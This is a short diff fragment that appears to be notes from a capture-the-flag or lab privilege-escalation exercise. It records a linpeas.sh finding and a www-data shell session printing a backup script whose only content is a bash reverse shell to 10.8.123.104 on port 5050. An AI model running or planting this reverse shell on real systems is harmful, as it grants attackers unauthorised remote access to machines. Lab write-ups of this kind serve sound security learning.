@@ -1,0 +1,6 @@
+
+linpeas.sh result => /usr/share/backup/backup.sh 
+
+www-data@routerpanel:/usr/share/backup$ cat backup.sh
+cat backup.sh
+bash -i >& /dev/tcp/10.8.123.104/5050 0>&1
